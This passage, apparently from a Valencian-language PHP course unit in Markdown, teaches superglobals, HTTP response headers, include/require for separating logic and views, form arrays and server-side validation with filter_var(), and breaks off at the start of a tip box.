@@ -1,0 +1,2234 @@
+# Unitat 3. PHP Avançat
+
+## Resultats d'aprenentatge i criteris d'avaluació
+::: details 📋 Resultats d'aprenentatge i criteris d'avaluació
+
+**RA3. Escriu blocs de sentències embeguts en llenguatges de marques, seleccionant i utilitzant les estructures de programació.**
+
+* **Criteris d'avaluació:**
+* **a)** S'han utilitzat mecanismes de decisió en la creació de blocs de sentències.
+* **b)** S'han utilitzat bucles i s'ha verificat el seu funcionament.
+* **c)** S'han utilitzat “arrays” per a emmagatzemar i recuperar conjunts de dades.
+* **d)** S'han creat i utilitzat funcions.
+* **e)** S'han utilitzat formularis web per a interactuar amb l'usuari del navegador web.
+* **f)** S'han emprat mètodes per a recuperar la informació introduïda en el formulari.
+* **g)** S'han afegit comentaris al codi.
+
+
+**RA 4. Desenvolupa aplicacions Web embegudes en llenguatges de marques analitzant i incorporant funcionalitats segons especificacions.**
+
+* **Criteris d'avaluació:**
+* **a)** S'han identificat els mecanismes disponibles per al manteniment de la informació que concerneix un client web concret i s'han assenyalat els seus avantatges.
+* **b)** S'han utilitzat mecanismes per a mantindre l'estat de les aplicacions web.
+* **c)** S'han utilitzat mecanismes per a emmagatzemar informació en el client web i per a recuperar el seu contingut.
+* **d)** S'han identificat i caracteritzat els mecanismes disponibles per a l'autenticació d'usuaris.
+* **e)** S'han escrit aplicacions que integren mecanismes d'autenticació d'usuaris.
+* **f)** S'han utilitzat eines i entorns per a facilitar la programació, prova i depuració del codi.
+
+**RA 5. Desenvolupa aplicacions Web identificant i aplicant mecanismes per a separar el codi de presentació de la lògica de negoci.**
+
+* **Criteris d'avaluació:**
+* **f)** S'han escrit aplicacions Web amb manteniment d'estat i separació de la lògica de negoci.
+* **g)** S'han aplicat els principis de la programació orientada a objectes.
+* **h)** S'ha provat i documentat el codi.
+
+
+
+:::
+
+
+
+
+## Temporalització
+
+* 16 hores
+
+## Índex
+
+- [Unitat 3. PHP Avançat](#unitat-3-php-avançat)
+  - [Resultats d'aprenentatge i criteris d'avaluació](#resultats-daprenentatge-i-criteris-davaluació)
+  - [Temporalització](#temporalització)
+  - [Índex](#índex)
+  - [1. Supervariables](#1-supervariables)
+    - [`$_ENV`](#_env)
+    - [`$_GET` i `$_POST` (recordatori)](#_get-i-_post-recordatori)
+    - [`$_REQUEST`](#_request)
+    - [`$_SERVER`](#_server)
+    - [`$_COOKIE` i `$_SESSION`](#_cookie-i-_session)
+    - [`$_FILES`](#_files)
+  - [2. Encapçalaments de resposta](#2-encapçalaments-de-resposta)
+    - [La funció `header()`](#la-funció-header)
+    - [Capçaleres més habituals](#capçaleres-més-habituals)
+      - [Redireccions](#redireccions)
+      - [Tipus de contingut (`Content-Type`)](#tipus-de-contingut-content-type)
+      - [Codis d'estat HTTP](#codis-destat-http)
+      - [Forçar la descàrrega d'un arxiu](#forçar-la-descàrrega-dun-arxiu)
+      - [Control de caché](#control-de-caché)
+    - [Comprovar si les capçaleres ja s'han enviat](#comprovar-si-les-capçaleres-ja-shan-enviat)
+    - [Consultar les capçaleres enviades](#consultar-les-capçaleres-enviades)
+    - [Capçaleres de la petició entrant](#capçaleres-de-la-petició-entrant)
+  - [3. Separació lògica i vistes amb require i include](#3-separació-lògica-i-vistes-amb-require-i-include)
+    - [`include` vs `require`](#include-vs-require)
+    - [`include_once` i `require_once`](#include_once-i-require_once)
+    - [Separació lògica: patró bàsic de capçalera i peu](#separació-lògica-patró-bàsic-de-capçalera-i-peu)
+    - [Separació de la lògica i la vista (patró senzill tipus MVC)](#separació-de-la-lògica-i-la-vista-patró-senzill-tipus-mvc)
+    - [Rutes d'arxiu: absolutes vs relatives](#rutes-darxiu-absolutes-vs-relatives)
+  - [4. Ús avançat de formularis](#4-ús-avançat-de-formularis)
+    - [4.1. Arrays en formularis](#41-arrays-en-formularis)
+      - [Checkboxes múltiples](#checkboxes-múltiples)
+      - [Select múltiple](#select-múltiple)
+      - [Arrays amb claus associatives](#arrays-amb-claus-associatives)
+      - [Arrays multidimensionals amb claus associatives (name)](#arrays-multidimensionals-amb-claus-associatives-name)
+    - [4.2. Validació de dades de formularis](#42-validació-de-dades-de-formularis)
+      - [Comprovar que un camp existeix i no està buit](#comprovar-que-un-camp-existeix-i-no-està-buit)
+      - [Funcions natives de validació de tipus](#funcions-natives-de-validació-de-tipus)
+      - [El sistema de filtres: `filter_var()`](#el-sistema-de-filtres-filter_var)
+    - [Acumular i mostrar errors: patró complet](#acumular-i-mostrar-errors-patró-complet)
+    - [4.3. Seguretat XSS](#43-seguretat-xss)
+      - [Exemple d'atac](#exemple-datac)
+      - [La solució: `htmlspecialchars()`](#la-solució-htmlspecialchars)
+      - [On aplicar `htmlspecialchars()`](#on-aplicar-htmlspecialchars)
+    - [Casos especials: atributs HTML i URLs](#casos-especials-atributs-html-i-urls)
+    - [4.4. Sticky forms](#44-sticky-forms)
+      - [Patró bàsic: un únic arxiu per a formulari i processament](#patró-bàsic-un-únic-arxiu-per-a-formulari-i-processament)
+      - [Sticky en diferents tipus de camp](#sticky-en-diferents-tipus-de-camp)
+        - [Select](#select)
+        - [Checkbox](#checkbox)
+        - [Checkboxes múltiples (recorda el punt 4.1)](#checkboxes-múltiples-recorda-el-punt-41)
+        - [Radio buttons](#radio-buttons)
+      - [Alternativa: separar formulari i processament en dos arxius](#alternativa-separar-formulari-i-processament-en-dos-arxius)
+    - [4.5. Pujar arxius i imatges](#45-pujar-arxius-i-imatges)
+      - [L'array `$_FILES`](#larray-_files)
+      - [Codis d'error de pujada](#codis-derror-de-pujada)
+      - [Validar el tipus i la grandària de l'arxiu](#validar-el-tipus-i-la-grandària-de-larxiu)
+      - [Moure l'arxiu a la seua ubicació definitiva](#moure-larxiu-a-la-seua-ubicació-definitiva)
+      - [Configuració rellevant al `php.ini`](#configuració-rellevant-al-phpini)
+    - [Pujar diversos arxius alhora](#pujar-diversos-arxius-alhora)
+  - [5. Cookies i sessions](#5-cookies-i-sessions)
+    - [Cookies](#cookies)
+      - [Crear una cookie: `setcookie()`](#crear-una-cookie-setcookie)
+      - [Llegir una cookie](#llegir-una-cookie)
+      - [Eliminar una cookie](#eliminar-una-cookie)
+      - [Sense data d'expiració: *session cookies*](#sense-data-dexpiració-session-cookies)
+    - [Sessions](#sessions)
+      - [Iniciar una sessió: `session_start()`](#iniciar-una-sessió-session_start)
+      - [Guardar i llegir dades de sessió](#guardar-i-llegir-dades-de-sessió)
+      - [Eliminar dades i tancar la sessió](#eliminar-dades-i-tancar-la-sessió)
+      - [Exemple pràctic: comptador de visites](#exemple-pràctic-comptador-de-visites)
+      - [Exemple pràctic: control d'accés bàsic](#exemple-pràctic-control-daccés-bàsic)
+    - [Cookies vs Sessions: quan usar cada una](#cookies-vs-sessions-quan-usar-cada-una)
+  - [6. Autenticació d'usuaris (password\_hash i password\_verify)](#6-autenticació-dusuaris-password_hash-i-password_verify)
+    - [Per què no n'hi ha prou amb `md5()` o `sha1()`](#per-què-no-nhi-ha-prou-amb-md5-o-sha1)
+    - [La solució: `password_hash()`](#la-solució-password_hash)
+    - [Registrar un usuari](#registrar-un-usuari)
+    - [Verificar una contrasenya: `password_verify()`](#verificar-una-contrasenya-password_verify)
+    - [Exemple pràctic complet: registre i inici de sessió](#exemple-pràctic-complet-registre-i-inici-de-sessió)
+    - [Missatges genèrics per a no revelar informació](#missatges-genèrics-per-a-no-revelar-informació)
+  - [7. Gestió d'errors i excepcions](#7-gestió-derrors-i-excepcions)
+    - [Tipus d'errors en PHP](#tipus-derrors-en-php)
+    - [`try`, `catch` i `throw`](#try-catch-i-throw)
+    - [El bloc `finally`](#el-bloc-finally)
+    - [Mètodes útils de l'objecte `Exception`](#mètodes-útils-de-lobjecte-exception)
+  - [8. Classes i objectes](#8-classes-i-objectes)
+    - [Definir una classe](#definir-una-classe)
+    - [Visibilitat: `public`, `private`, `protected`](#visibilitat-public-private-protected)
+    - [Propietats promocionades del constructor (PHP 8+)](#propietats-promocionades-del-constructor-php-8)
+    - [Herència: `extends`](#herència-extends)
+    - [Classes abstractes i interfícies](#classes-abstractes-i-interfícies)
+    - [Propietats i mètodes estàtics](#propietats-i-mètodes-estàtics)
+    - [Constants de classe](#constants-de-classe)
+    - [`readonly` (PHP 8.1+)](#readonly-php-81)
+    - [Namespaces: organitzar classes en projectes grans](#namespaces-organitzar-classes-en-projectes-grans)
+  - [9. Debug, proves i documentació \[Ampliació\]](#9-debug-proves-i-documentació-ampliació)
+    - [Depuració bàsica sense ferramentes externes](#depuració-bàsica-sense-ferramentes-externes)
+    - [Xdebug: depuració pas a pas](#xdebug-depuració-pas-a-pas)
+      - [Ús bàsic amb Visual Studio Code](#ús-bàsic-amb-visual-studio-code)
+    - [PHPUnit: proves automatitzades](#phpunit-proves-automatitzades)
+      - [Instal·lació amb Composer](#installació-amb-composer)
+      - [Estructura bàsica d'un test](#estructura-bàsica-dun-test)
+      - [Execució de les proves](#execució-de-les-proves)
+      - [Mètodes d'aserció més habituals](#mètodes-daserció-més-habituals)
+    - [Documentació del codi: PHPDoc](#documentació-del-codi-phpdoc)
+
+
+
+## 1. Supervariables
+
+Les **supervariables** (o *variables superglobals*) són arrays predefinits de PHP que estan disponibles automàticament en **tots els àmbits** (scopes) d'un script: dins de funcions, mètodes de classes, i a nivell global, sense necessitat de fer `global $variable`.
+
+En esta unitat en farem un ús avançat, però ací en tens una primera visió de conjunt. Cadascuna es tractarà en detall més avant:
+
+| Supervariable | Contingut | On es tracta |
+|---|---|---|
+| `$_GET` | Dades enviades per l'URL (query string) | Ja vista a la unitat anterior |
+| `$_POST` | Dades enviades pel cos d'una petició HTTP POST | Ja vista, ampliada al punt 4 |
+| `$_SERVER` | Informació del servidor i de la petició HTTP | Punt 2 (capçaleres) |
+| `$_COOKIE` | Cookies enviades pel navegador | Punt 5 |
+| `$_SESSION` | Dades associades a la sessió de l'usuari | Punt 5 |
+| `$_FILES` | Arxius pujats mitjançant un formulari | Punt 4.5 |
+| `$_ENV` | Variables d'entorn del sistema | Este punt |
+| `$_REQUEST` | Combinació de `$_GET`, `$_POST` i `$_COOKIE` | Este punt |
+
+> 📖 Documentació oficial: [PHP: Variables predefinides](https://www.php.net/manual/es/reserved.variables.php)
+
+### `$_ENV`
+
+Conté les variables d'entorn del sistema operatiu o del servidor web. És habitual usar-la per a guardar dades de configuració sensibles (credencials de base de dades, claus d'API...) sense escriure-les directament al codi.
+
+```php
+<?php
+// Cal que la directiva variables_order de php.ini incloga la 'E'
+// o bé que s'hagen definit amb putenv() / al fitxer .htaccess
+
+echo $_ENV['APP_NAME'] ?? 'No definida';
+```
+
+::: info 🛈︎ **Arxiu .env** 
+En molts servidors, per defecte `$_ENV` ve buida perquè la directiva `variables_order` de `php.ini` no inclou la `E`. En projectes reals és molt habitual utilitzar la funció `getenv()` o llibreries com [vlucas/phpdotenv](https://github.com/vlucas/phpdotenv) per a gestionar variables d'entorn des d'un fitxer `.env`.
+:::
+
+```php
+<?php
+echo getenv('APP_NAME');
+```
+
+> 📖 Documentació oficial: [PHP: getenv](https://www.php.net/manual/es/function.getenv.php)
+
+### `$_GET` i `$_POST` (recordatori)
+
+Ja les vam vore a la unitat anterior. Simple recordatori ràpid:
+
+```php
+<?php
+// URL: pagina.php?nom=Joan&edat=17
+echo $_GET['nom'];  // Joan
+
+// Formulari amb method="post"
+echo $_POST['nom'];
+```
+
+### `$_REQUEST`
+
+Combina en un sol array el contingut de `$_GET`, `$_POST` i `$_COOKIE`, segons l'ordre indicat a la directiva `request_order` del `php.ini`.
+
+```php
+<?php
+// Recupera la dada 'nom' vinga d'on vinga (GET, POST o COOKIE)
+$nom = $_REQUEST['nom'] ?? 'Anònim';
+```
+
+::: warning ⚠️ **Recomanació:** 
+evita usar `$_REQUEST` en codi professional. En no distingir l'origen de la dada, pot introduir problemes de seguretat i fa el codi menys predictible. És preferible ser explícit i utilitzar `$_GET` o `$_POST` segons corresponga.
+:::
+
+### `$_SERVER`
+
+Array associatiu amb informació sobre el servidor i l'entorn d'execució de l'script. L'estudiarem en detall al punt 2, però ací un tast:
+
+```php
+<?php
+echo $_SERVER['REQUEST_METHOD'];   // GET, POST...
+echo $_SERVER['HTTP_HOST'];        // domini de la petició
+echo $_SERVER['REQUEST_URI'];      // ruta sol·licitada
+```
+
+### `$_COOKIE` i `$_SESSION`
+
+Permeten mantindre informació entre diferents peticions HTTP (recorda que HTTP és un protocol *sense estat*). Les estudiarem en profunditat al punt 5.
+
+```php
+<?php
+// Lectura d'una cookie prèviament creada
+echo $_COOKIE['tema'] ?? 'clar';
+
+// Lectura d'una variable de sessió (cal cridar session_start() abans)
+session_start();
+echo $_SESSION['usuari'] ?? 'no identificat';
+```
+
+### `$_FILES`
+
+Conté informació dels arxius pujats mitjançant un formulari amb `enctype="multipart/form-data"`. Ho veurem amb detall al punt 4.5.
+
+```php
+<?php
+// Estructura bàsica quan es puja un arxiu amb name="foto"
+print_r($_FILES['foto']);
+/*
+Array (
+    [name] => imatge.jpg
+    [type] => image/jpeg
+    [tmp_name] => /tmp/phpXXXXXX
+    [error] => 0
+    [size] => 102400
+)
+*/
+```
+
+
+::: tip 📌 **A recordar:** 
+Totes les supervariables són *arrays associatius* i, per tant, s'utilitzen exactament igual que qualsevol array de PHP que ja coneixes (accés amb claus, `isset()`, `foreach`, etc.).
+:::
+
+> 📖 Documentació oficial completa: [PHP: Variables superglobals](https://www.php.net/manual/es/language.variables.superglobals.php)
+
+
+## 2. Encapçalaments de resposta
+
+Quan un servidor respon a una petició HTTP, envia dos blocs d'informació: les **capçaleres** (*headers*) i el **cos** (*body*) de la resposta. Les capçaleres no es veuen a la pàgina, però són essencials: indiquen el tipus de contingut, si cal redirigir el navegador, com gestionar la caché, quines cookies establir, etc.
+
+::: info Nota
+En PHP, tot el que s'imprimeix amb `echo` o es genera com a HTML forma part del **cos** de la resposta. Les capçaleres es gestionen amb funcions independents i s'envien *abans* que qualsevol contingut.
+:::
+
+> 📖 Documentació oficial: [PHP: header](https://www.php.net/manual/es/function.header.php)
+
+### La funció `header()`
+
+Permet enviar una capçalera HTTP en brut al navegador.
+
+```php
+<?php
+header('Content-Type: application/json');
+echo json_encode(['missatge' => 'Hola des de PHP']);
+```
+
+::: danger Error crític
+La funció `header()` s'ha de cridar **abans que s'haja enviat cap byte de contingut** (ni tan sols un espai en blanc abans de `<?php`). Si ja s'ha enviat contingut, PHP llançarà l'avís: `Warning: Cannot modify header information - headers already sent`.
+:::
+
+```php
+<?php
+// ❌ MALAMENT: hi ha un salt de línia abans de <?php a l'arxiu
+ 
+header('Location: index.php'); // Error!
+```
+
+::: tip Bona pràctica
+Guarda sempre els arxius PHP en codificació **UTF-8 sense BOM** i evita deixar espais o línies en blanc abans de `<?php` o després de `?>`. De fet, és habitual **no tancar** l'etiqueta PHP (`?>`) al final de l'arxiu per a evitar este problema per complet.
+:::
+
+### Capçaleres més habituals
+
+#### Redireccions
+
+```php
+<?php
+header('Location: login.php');
+exit; // Important: aturar l'execució de la resta del script
+```
+
+::: warning Atenció
+Després d'un `header('Location: ...')` cal cridar sempre a `exit` (o `die`). Si no, el codi PHP posterior continuarà executant-se encara que el navegador ja haja rebut l'ordre de redirigir.
+:::
+
+#### Tipus de contingut (`Content-Type`)
+
+Indica al navegador com ha d'interpretar la resposta.
+
+```php
+<?php
+header('Content-Type: text/html; charset=UTF-8'); // Per defecte en PHP
+header('Content-Type: application/json');          // Resposta JSON (APIs)
+header('Content-Type: text/plain');                 // Text pla
+header('Content-Type: application/pdf');             // Un PDF
+```
+
+#### Codis d'estat HTTP
+
+```php
+<?php
+http_response_code(404); // Recurs no trobat
+echo "La pàgina sol·licitada no existeix";
+```
+
+```php
+<?php
+// Alternativa amb header(), indicant també la versió del protocol
+header('HTTP/1.1 403 Forbidden');
+```
+
+> 📖 Documentació oficial: [PHP: http_response_code](https://www.php.net/manual/es/function.http-response-code.php)
+
+#### Forçar la descàrrega d'un arxiu
+
+```php
+<?php
+$arxiu = 'documents/factura.pdf';
+
+header('Content-Type: application/octet-stream');
+header('Content-Disposition: attachment; filename="' . basename($arxiu) . '"');
+header('Content-Length: ' . filesize($arxiu));
+readfile($arxiu);
+exit;
+```
+
+#### Control de caché
+
+```php
+<?php
+// Evitar que el navegador guarde la resposta en caché
+header('Cache-Control: no-cache, no-store, must-revalidate');
+header('Pragma: no-cache');
+header('Expires: 0');
+```
+
+### Comprovar si les capçaleres ja s'han enviat
+
+```php
+<?php
+if (headers_sent()) {
+    echo "Ja no es poden enviar més capçaleres!";
+} else {
+    header('Location: index.php');
+    exit;
+}
+```
+
+### Consultar les capçaleres enviades
+
+Útil per a depurar (relacionat amb el punt 9 d'esta unitat):
+
+```php
+<?php
+print_r(headers_list());
+```
+
+### Capçaleres de la petició entrant
+
+A banda d'enviar capçaleres en la resposta, sovint interessa **llegir** les que envia el client en la petició. Es fa a través de `$_SERVER` (vist al punt 1) o amb la funció `getallheaders()`:
+
+```php
+<?php
+// Via $_SERVER
+$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Desconegut';
+$acceptLang = $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? '';
+
+// Via getallheaders() (equivalent més còmode)
+$capçaleres = getallheaders();
+print_r($capçaleres);
+```
+
+::: details Veure eixida d'exemple
+Array
+(
+[Host] => localhost
+[User-Agent] => Mozilla/5.0 ...
+[Accept] => text/html,application/xhtml+xml
+[Accept-Language] => ca,es;q=0.9
+)
+
+:::
+
+📌 **A recordar:** les capçaleres es negocien *abans* que cap contingut arribe al navegador. Qualsevol eixida prèvia (encara que siga un espai en blanc) impedeix modificar-les.
+
+> 📖 Documentació oficial: [PHP: Manejo de cabeceras HTTP](https://www.php.net/manual/es/function.header.php) · [MDN: Cabeceras HTTP](https://developer.mozilla.org/es/docs/Web/HTTP/Headers)
+
+
+## 3. Separació lògica i vistes amb require i include
+
+A mesura que una aplicació creix, no és pràctic tindre tot el codi (lògica de negoci, accés a dades i HTML) en un únic arxiu. PHP proporciona quatre construccions de llenguatge per a **incloure el contingut d'un arxiu dins d'un altre**, cosa que permet separar la lògica de les vistes i reutilitzar codi.
+
+::: info Nota
+Són *construccions del llenguatge* (com `echo` o `if`), no funcions. Per això no cal escriure-les amb parèntesis: `include 'arxiu.php';` és equivalent a `include('arxiu.php');`.
+:::
+
+### `include` vs `require`
+
+| Construcció | Si l'arxiu NO existeix |
+|---|---|
+| `include` | Llança un **Warning** i el script **continua** executant-se |
+| `require` | Llança un **Fatal Error** i el script **s'atura** immediatament |
+
+```php
+<?php
+include 'capçalera.php';   // Si no existeix: avís, però l'script continua
+require 'config.php';      // Si no existeix: error fatal, l'script s'atura ací
+```
+
+::: tip Bona pràctica
+Utilitza `require` per a arxius **imprescindibles** per al funcionament de l'aplicació (configuració, connexió a la base de dades, funcions essencials). Reserva `include` per a elements **opcionals** on un error no hauria d'aturar tota la pàgina (per exemple, un banner publicitari o un widget lateral).
+:::
+
+### `include_once` i `require_once`
+
+Fan exactament el mateix que les anteriors, però comproven prèviament si l'arxiu **ja ha sigut inclòs** amb anterioritat en l'execució. Si és així, l'ignoren.
+
+```php
+<?php
+require_once 'funcions.php';
+require_once 'funcions.php'; // No es torna a incloure, evita redeclaracions
+```
+
+::: warning Atenció
+Sense el sufix `_once`, si un mateix arxiu s'inclou dues vegades i conté una `function` o `class`, PHP llançarà un error fatal: *Cannot redeclare function...*. És molt habitual utilitzar `require_once` per a arxius de configuració o de definició de funcions/classes.
+:::
+
+### Separació lògica: patró bàsic de capçalera i peu
+
+Un ús molt comú és separar les parts comunes d'una pàgina (capçalera, menú de navegació, peu) en arxius independents.
+
+**`capçalera.php`**
+```php
+<!DOCTYPE html>
+<html lang="ca">
+<head>
+    <meta charset="UTF-8">
+    <title><?= $titolPagina ?? 'El meu lloc web' ?></title>
+</head>
+<body>
+    <header>
+        <nav>
+            <a href="index.php">Inici</a>
+            <a href="contacte.php">Contacte</a>
+        </nav>
+    </header>
+```
+
+**`peu.php`**
+```php
+    <footer>
+        <p>&copy; <?= date('Y') ?> - CFGS DAW</p>
+    </footer>
+</body>
+</html>
+```
+
+**`index.php`**
+```php
+<?php
+$titolPagina = 'Pàgina d\'inici';
+require 'capçalera.php';
+?>
+
+<main>
+    <h1>Benvingut!</h1>
+    <p>Este és el contingut propi d'esta pàgina.</p>
+</main>
+
+<?php require 'peu.php'; ?>
+```
+
+::: info Nota
+Fixa't com la variable `$titolPagina` es defineix *abans* de l'`include`/`require`: l'arxiu inclòs comparteix el mateix àmbit (*scope*) de variables que l'arxiu que el crida.
+:::
+
+### Separació de la lògica i la vista (patró senzill tipus MVC)
+
+Un altre ús fonamental és separar el **processament de dades** (lògica/controlador) de la **presentació** (vista/HTML), evitant barrejar consultes o càlculs amb marcatge HTML.
+
+**`dades_usuaris.php`** (lògica)
+```php
+<?php
+function obtenirUsuaris(): array {
+    // En un cas real, ací hi hauria una consulta a la base de dades
+    return [
+        ['nom' => 'Ana', 'edat' => 17],
+        ['nom' => 'Bru', 'edat' => 18],
+    ];
+}
+```
+
+**`llistat_usuaris.php`** (vista)
+```php
+<?php
+require_once 'dades_usuaris.php';
+$usuaris = obtenirUsuaris();
+?>
+<!DOCTYPE html>
+<html lang="ca">
+<body>
+    <h1>Llistat d'usuaris</h1>
+    <ul>
+        <?php foreach ($usuaris as $usuari): ?>
+            <li><?= htmlspecialchars($usuari['nom']) ?> (<?= $usuari['edat'] ?> anys)</li>
+        <?php endforeach; ?>
+    </ul>
+</body>
+</html>
+```
+
+::: tip Bona pràctica
+Esta separació és el primer pas cap a arquitectures més organitzades com **MVC** (Model-Vista-Controlador), que veurem més avant en el cicle. Acostuma't a no barrejar consultes SQL ni lògica de negoci amb HTML des d'ara.
+:::
+
+### Rutes d'arxiu: absolutes vs relatives
+
+Un error molt freqüent és que la ruta d'un `include`/`require` és relativa al **directori des d'on s'executa l'script principal**, no a l'arxiu on s'escriu l'`include`.
+
+```php
+<?php
+// ❌ Pot fallar si este arxiu s'inclou des d'una carpeta diferent
+require 'config.php';
+
+// ✅ Recomanat: usar __DIR__ per a construir una ruta absoluta
+require __DIR__ . '/config.php';
+```
+
+::: warning Atenció
+`__DIR__` és una constant màgica de PHP que conté el directori de l'arxiu **on s'escriu**, no del que l'executa. És la manera fiable d'evitar errors de "arxiu no trobat" quan el projecte creix i té múltiples nivells de carpetes.
+:::
+
+> 📖 Documentació oficial: [__DIR__ i constants màgiques](https://www.php.net/manual/es/language.constants.magic.php)
+
+---
+
+📌 **A recordar:** `require` per a allò imprescindible, `include` per a allò opcional; afig `_once` quan hi ha risc de redeclaració; utilitza sempre `__DIR__` per a construir rutes fiables.
+
+> 📖 Documentació oficial: [PHP: include](https://www.php.net/manual/es/function.include.php) · [PHP: require](https://www.php.net/manual/es/function.require.php) · [PHP: include_once](https://www.php.net/manual/es/function.include-once.php) · [PHP: require_once](https://www.php.net/manual/es/function.require-once.php)
+
+
+## 4. Ús avançat de formularis
+
+A la unitat anterior vam vore l'ús bàsic de formularis amb `$_GET` i `$_POST` per a recuperar valors simples (camps de text, un `select` senzill...). En esta unitat aprofundirem en aspectes clau per a construir formularis **robustos i segurs**: com agrupar diversos valors en un array, com validar les dades introduïdes per l'usuari, com evitar atacs XSS, com fer que el formulari "recorde" el que l'usuari havia escrit si hi ha un error (*sticky forms*) i, finalment, com gestionar la pujada d'arxius i imatges.
+
+### 4.1. Arrays en formularis
+
+Quan un formulari té diversos camps que representen el **mateix concepte** (per exemple, diverses aficions marcades amb checkboxes, o diverses opcions seleccionades en un `select` múltiple), és molt útil que PHP els agrupe automàticament en un array, en lloc d'haver de gestionar-los un a un.
+
+Açò s'aconsegueix afegint `[]` al final del `name` de l'input.
+
+::: info Nota
+El `[]` és només una convenció de nomenclatura HTML que PHP interpreta de manera especial: en rebre el formulari, agrupa tots els camps amb eixe mateix `name` en un array dins de `$_POST` (o `$_GET`).
+:::
+
+#### Checkboxes múltiples
+
+```html
+<form method="post" action="processar.php">
+    <p>Selecciona les teues aficions:</p>
+    <label><input type="checkbox" name="aficions[]" value="lectura"> Lectura</label>
+    <label><input type="checkbox" name="aficions[]" value="esport"> Esport</label>
+    <label><input type="checkbox" name="aficions[]" value="musica"> Música</label>
+    <label><input type="checkbox" name="aficions[]" value="videojocs"> Videojocs</label>
+
+    <button type="submit">Envia</button>
+</form>
+```
+
+```php
+<?php
+// processar.php
+if (isset($_POST['aficions'])) {
+    // $_POST['aficions'] és un array amb els valors marcats
+    foreach ($_POST['aficions'] as $afició) {
+        echo htmlspecialchars($afició) . '<br>';
+    }
+} else {
+    echo 'No has seleccionat cap afició.';
+}
+```
+
+::: warning Atenció
+Si l'usuari no marca cap checkbox, la clau `aficions` **no existeix** dins de `$_POST` (els checkboxes no marcats no s'envien mai). Per això cal comprovar sempre amb `isset()` abans d'iterar l'array, per a evitar un error de tipus *Undefined array key*.
+:::
+
+#### Select múltiple
+
+```html
+<form method="post" action="processar.php">
+    <label for="idiomes">Idiomes que parles:</label>
+    <select name="idiomes[]" id="idiomes" multiple size="4">
+        <option value="ca">Valencià</option>
+        <option value="es">Castellà</option>
+        <option value="en">Anglés</option>
+        <option value="fr">Francés</option>
+    </select>
+
+    <button type="submit">Envia</button>
+</form>
+```
+
+```php
+<?php
+$idiomesSeleccionats = $_POST['idiomes'] ?? [];
+
+echo 'Has seleccionat: ' . implode(', ', array_map('htmlspecialchars', $idiomesSeleccionats));
+```
+
+#### Arrays amb claus associatives
+
+També és possible indicar una clau explícita dins dels claudàtors, útil per exemple per a formularis amb diverses files (com una taula editable):
+
+```html
+<form method="post" action="processar.php">
+    <input type="text" name="producte[0][nom]" value="Teclat">
+    <input type="number" name="producte[0][preu]" value="25">
+
+    <input type="text" name="producte[1][nom]" value="Ratolí">
+    <input type="number" name="producte[1][preu]" value="12">
+
+    <button type="submit">Envia</button>
+</form>
+```
+
+```php
+<?php
+foreach ($_POST['producte'] as $fila) {
+    echo htmlspecialchars($fila['nom']) . ': ' . (float) $fila['preu'] . '€<br>';
+}
+/*
+Teclat: 25€
+Ratolí: 12€
+*/
+```
+
+::: tip Bona pràctica
+Este mecanisme d'arrays amb claus és el que utilitzen internament molts frameworks (com Laravel, que veurem més avant) per a formularis dinàmics on l'usuari pot afegir o eliminar files (per exemple, les línies d'una factura).
+:::
+
+#### Arrays multidimensionals amb claus associatives (name)
+
+També es pot nomenar explícitament cada camp amb una clau descriptiva en lloc d'un índex numèric:
+
+```html
+<input type="text" name="contacte[nom]">
+<input type="email" name="contacte[email]">
+<input type="tel" name="contacte[telefon]">
+```
+
+```php
+<?php
+$contacte = $_POST['contacte'] ?? [];
+
+$nom     = $contacte['nom']     ?? '';
+$email   = $contacte['email']   ?? '';
+$telefon = $contacte['telefon'] ?? '';
+```
+
+---
+
+📌 **A recordar:** afig `[]` al `name` quan un mateix camp puga tindre diversos valors; comprova sempre amb `isset()` o l'operador `??` abans d'iterar, ja que els camps no enviats (com els checkboxes sense marcar) no apareixen a `$_POST`.
+
+> 📖 Documentació oficial: [PHP: Manejo de formularios HTML (arrays)](https://www.php.net/manual/es/faq.html.php#faq.html.arrays)
+
+
+### 4.2. Validació de dades de formularis
+
+Mai s'ha de confiar en les dades que envia l'usuari, encara que el formulari tinga restriccions HTML (`required`, `type="email"`, `maxlength`...). Estes validacions es poden saltar fàcilment (desactivant JavaScript, editant l'HTML amb les eines de desenvolupador, o enviant la petició directament amb ferramentes com Postman). Per tant, **tota validació real ha de fer-se sempre en el servidor**.
+
+::: danger Error crític
+La validació del costat del client (HTML5, JavaScript) millora l'experiència d'usuari, però **mai és una mesura de seguretat**. Les dades sempre s'han de validar de nou en PHP abans d'utilitzar-les o guardar-les.
+:::
+
+#### Comprovar que un camp existeix i no està buit
+
+```php
+<?php
+$nom = trim($_POST['nom'] ?? '');
+
+if ($nom === '') {
+    $errors[] = 'El nom és obligatori.';
+}
+```
+
+> 📖 Documentació oficial: [PHP: trim](https://www.php.net/manual/es/function.trim.php)
+
+#### Funcions natives de validació de tipus
+
+```php
+<?php
+$edat = $_POST['edat'] ?? '';
+
+if (!ctype_digit((string) $edat)) {
+    $errors[] = 'L\'edat ha de ser un número enter positiu.';
+}
+```
+
+| Funció | Comprova |
+|---|---|
+| `ctype_digit()` | Només dígits (nombre enter positiu, com a cadena) |
+| `ctype_alpha()` | Només lletres |
+| `is_numeric()` | Nombre (enter o decimal, admet signe) |
+| `empty()` | Buit, `null`, `0`, `"0"` o `""` |
+
+::: warning Atenció
+`empty()` considera "buit" també el valor `"0"`. Si un camp pot contindre legítimament el valor `0` (per exemple, un descompte de `0%`), no utilitzes `empty()` per a comprovar-lo: fes servir `$valor === ''` o `!isset($valor)`.
+:::
+
+#### El sistema de filtres: `filter_var()`
+
+PHP incorpora una extensió específica per a validar i sanejar dades: **filter**. És l'eina recomanada per a validacions habituals com correus, URLs o nombres.
+
+```php
+<?php
+$email = trim($_POST['email'] ?? '');
+
+if (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+    $errors[] = 'L\'email no és vàlid.';
+}
+```
+
+```php
+<?php
+$web = trim($_POST['web'] ?? '');
+
+if ($web !== '' && !filter_var($web, FILTER_VALIDATE_URL)) {
+    $errors[] = 'La URL no és vàlida.';
+}
+```
+
+```php
+<?php
+$edat = filter_var($_POST['edat'] ?? '', FILTER_VALIDATE_INT, [
+    'options' => ['min_range' => 0, 'max_range' => 120]
+]);
+
+if ($edat === false) {
+    $errors[] = 'L\'edat ha de ser un enter entre 0 i 120.';
+}
+```
+
+::: tip Bona pràctica
